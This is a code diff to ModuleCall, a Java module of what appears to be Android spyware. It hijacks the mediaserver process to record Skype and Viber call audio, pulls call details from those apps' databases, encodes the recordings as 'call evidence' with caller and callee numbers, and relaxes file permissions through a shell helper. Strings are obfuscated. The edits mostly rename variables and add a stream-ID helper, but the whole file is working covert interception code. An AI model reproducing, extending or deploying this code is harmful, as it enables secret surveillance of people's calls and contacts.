@@ -92,7 +92,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	private static final Object sync = new Object();
 	private static BlockingQueue<String> calls;
 	private EncodingTask encodingTask;
-	private CallBack cb;
+	private CallBack hjcb;
 	private Instrument hijack;
 
 	public static final byte[] AMR_HEADER = new byte[] { 35, 33, 65, 77, 82, 10 };
@@ -229,8 +229,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 	private boolean installHijack() {
 		// Initialize the callback system
-		cb = new CallBack();
-		cb.register(new InternalCallBack());
+		hjcb = new CallBack();
+		hjcb.register(new HijackCallBack());
 
 		hijack = new Instrument(M.e("mediaserver"), AudioEncoder.getAudioStorage());
 
@@ -271,6 +271,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			// Stored filetime (unix epoch() is in seconds not ms)
 			String split[] = fullName.split("-");
 			long epoch = Long.parseLong(split[1]);
+			//long id = Long.parseLong(split[2]);
 
 			// Files older than 24 hours are removed
 			if (now - epoch > 60 * 60 * 24) {
@@ -299,7 +300,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 		File file[] = f.listFiles(filter);
 
-		// Che palle Java!
+		// sort by name
 		List<File> filesList = new java.util.ArrayList<File>();
 		filesList.addAll(java.util.Arrays.asList(file));
 		java.util.Collections.sort(filesList);
@@ -325,7 +326,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			Check.log(TAG + "(addToEncodingList): adding \"" + s + "\" to the encoding list");
 		}
 
-		cb.trigger(s);
+		hjcb.trigger(s);
 
 		// Make it read-write in any case
 		Execute.execute(Configuration.shellFile + " " + "pzm" + " " + "666" + " " + s);
@@ -511,7 +512,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			}
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (saveCallEvidence): deleting file: " + file);
+				//Check.log(TAG + " (saveCallEvidence): deleting file: " + file);
 			}
 
 			file.delete();
@@ -556,7 +557,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	private byte[] getCallAdditionalData(String peer, String myNumber, boolean incoming, DateTime dateBegin,
 			DateTime dateEnd, int channels, int programId) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (getCallAdditionalData): " + peer);
+			Check.log(TAG + " (getCallAdditionalData): caller: " + peer+ " callee: " + myNumber);
 		}
 
 		if (Cfg.DEBUG) {
@@ -914,17 +915,21 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	// start: call start date
 	// sec_length: call length in seconds
 	// type: call type (Skype, Viber, Paltalk, Hangout)
-	public synchronized void encodeChunks(String f) {
+	public synchronized void encodeChunks(AutoFile file) {
 		int first_epoch, last_epoch;
-		AudioEncoder audioEncoder = new AudioEncoder(f);
+		AudioEncoder audioEncoder = new AudioEncoder(file.getFilename());
 
 		first_epoch = audioEncoder.getCallStartTime();
 		last_epoch = audioEncoder.getCallEndTime();
 
 		// Now rawPcm contains the raw data
-		String encodedFile = f + M.e(".err");
+		String encodedFile = file.getFilename() + M.e(".err");
+		String encodedFileName = file.getName();
 
 		boolean remote = encodedFile.endsWith(M.e("-r.tmp.err"));
+		
+		long streamId = getStreamId(encodedFile);
+		boolean ret = callInfo.setStreamId(remote, streamId);
 
 		if (!updateCallInfo(callInfo, false)) {
 			if (Cfg.DEBUG) {
@@ -935,17 +940,17 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		}
 		
 		// Decide heuristics logic
-		boolean heur = true;
+		boolean heuristic = true;
 		
-		if (!callInfo.heur && remote) { // Skype
+		if (!callInfo.heuristic && remote) { // Skype
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(encodeChunks): Skype call in progress, applying bitrate heuristics on remote channel only");
 			}
 			
-			heur = false;
+			heuristic = false;
 		}
 
-		if (audioEncoder.encodetoAmr(encodedFile, audioEncoder.resample(heur))) {
+		if (audioEncoder.encodetoAmr(encodedFile, audioEncoder.resample(heuristic))) {
 			Date begin = new Date(first_epoch * 1000L);
 			Date end = new Date(last_epoch * 1000L);
 
@@ -973,7 +978,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 						sort_chunks();
 					} else {
 						if (Cfg.DEBUG) {
-							Check.log(TAG + " (encodeChunks): first LOCAL: " + encodedFile);
+							Check.log(TAG + " (encodeChunks): first LOCAL: " + encodedFileName);
 						}
 						started = true;
 
@@ -983,8 +988,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 						for (Chunk chunk : chunks) {
 							if (chunk.end.getTime() < firstl.begin.getTime()) {
-								AutoFile file = new AutoFile(encodedFile);
-								file.delete();
+								AutoFile filetmp = new AutoFile(encodedFile);
+								filetmp.delete();
 							} else {
 								saveCallEvidence(caller, callee, chunk, callInfo.programId);
 							}
@@ -1027,11 +1032,23 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 		// Remove file
 		if (Cfg.DEBUG) {
-			Check.log(TAG + "(encodeChunks): deleting " + f);
+			//Check.log(TAG + "(encodeChunks): deleting " + file.getName());
 		}
 
 		audioEncoder.removeRawFile();
 
+	}
+
+	private long getStreamId(String fullName) {
+
+		// Stored filetime (unix epoch() is in seconds not ms)
+		String split[] = fullName.split("-");
+		long epoch = Long.parseLong(split[1]);
+		long streamId = Long.parseLong(split[2]);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (getStreamId): " + streamId);
+		}
+		return streamId;
 	}
 
 	private void sort_chunks() {
@@ -1073,7 +1090,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		closeCallEvidence(caller, callee, true, begin, end, callInfo.programId);
 	}
 
-	private boolean updateCallInfo(CallInfo callInfo, boolean end) {
+	private boolean updateCallInfo(CallInfo callInfo,  boolean end) {
 
 		// RunningAppProcessInfo fore = runningProcesses.getForeground();
 		if (callInfo.valid) {
@@ -1092,13 +1109,16 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			callInfo.account = account;
 			callInfo.programId = 0x0146;
 			callInfo.delay = false;
-			callInfo.heur = false;
+			callInfo.heuristic = false;
 
 			GenericSqliteHelper helper = ChatSkype.openSkypeDBHelper(account);
 
 			boolean ret = false;
 			if (helper != null) {
 				ret = ChatSkype.getCurrentCall(helper, callInfo);
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (updateCallInfo): id: " + callInfo.id + " peer: " + callInfo.peer);
+				}
 			}
 
 			return ret;
@@ -1106,7 +1126,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			boolean ret = false;
 			callInfo.processName = M.e("com.viber.voip");
 			callInfo.delay = true;
-			callInfo.heur = true;
+			callInfo.heuristic = true;
 			
 			// open DB
 			callInfo.programId = 0x0148;
@@ -1134,7 +1154,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		return false;
 	}
 
-	public class InternalCallBack implements ICallBack {
+	public class HijackCallBack implements ICallBack {
 		private static final String TAG = "InternalCallBack";
 
 		public <O> void run(O o) {
